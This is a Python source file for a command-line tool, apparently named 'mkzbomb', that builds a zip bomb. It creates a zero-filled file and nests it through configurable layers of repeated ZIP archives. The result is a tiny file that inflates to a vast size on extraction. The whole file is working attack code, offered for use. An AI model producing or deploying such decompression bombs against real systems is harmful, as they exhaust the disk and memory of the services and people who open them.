import os
import platform
import argparse
import string
import random
import shutil
import zipfile
from mkzbomb.progress import DeterminateProgress

__version__ = "1.0.1"

welcome = """
            _     _______                     _     
           | |   |___  / |                   | |    
  _ __ ___ | | __   / /| |__   ___  _ __ ___ | |__  
 | '_ ` _ \| |/ /  / / | '_ \ / _ \| '_ ` _ \| '_ \ 
 | | | | | |   <  / /__| |_) | (_) | | | | | | |_) |
 |_| |_| |_|_|\_\/_____|_.__/ \___/|_| |_| |_|_.__/ v:%s"""

tmpDir = "tmp" + os.sep


def main():
    parser = argparse.ArgumentParser(description="Build ZipBomb.")
    parser.add_argument('name', help='Output name')
    parser.add_argument('--layer', help='Set zbomb deep', type=int, default=6)
    parser.add_argument('--cps', help='Copies for each layer', type=int, default=16)
    parser.add_argument('--size', help='Set size of \'zero\' file (Size in KB)', type=int, default=42)
    args = parser.parse_args()

    if 'windows' in platform.system().lower():
        print("Windows detected, BE CAREFUL!")

    print(welcome % __version__, end="\n\n")

    # Builder
    if not os.path.exists(tmpDir):
        print("Creating temporary working directory...")
        os.makedirs(tmpDir)

    compress = mk_rndfile(args.size)
    args.layer += 1

    pbar = DeterminateProgress("Computing...")
    pbar.setMax(args.layer)
    pbar.start()
    for i in range(args.layer):
        cname = mk_rndstring(6)
        for j in range(args.cps):
            zipf = zipfile.ZipFile(
                not (i == args.layer - 1) and tmpDir + cname + str(j) + ".zip" or args.name, "w",
                compression=zipfile.ZIP_DEFLATED)
            if i == 0:
                zipf.write(tmpDir + compress, compress)
            else:
                for k in range(args.cps):
                    _file = tmpDir + compress + str(k) + ".zip"
                    zipf.write(_file, compress + str(k) + ".zip")
                    if j == args.cps - 1 or i == args.layer - 1:
                        os.remove(_file)
            if i == args.layer - 1:
                break
            zipf.close()
        compress = cname
        pbar.incProgress(1)
    pbar.sync()
    clear()
    return 0


def mk_rndfile(size):
    filename = mk_rndstring(4)
    fbase = open(tmpDir + os.sep + filename, "wb")
    fbase.write(b"\0" * (size * 1024))
    fbase.close()
    return filename


def mk_rndstring(_len):
    _str = string.ascii_letters + string.digits
    return str().join(random.choice(_str) for _ in range(_len))


def clear():
    print("Removing temporary working directory...")
    if os.path.exists(tmpDir):
        shutil.rmtree(tmpDir)


if __name__ == "__main__":
    main()
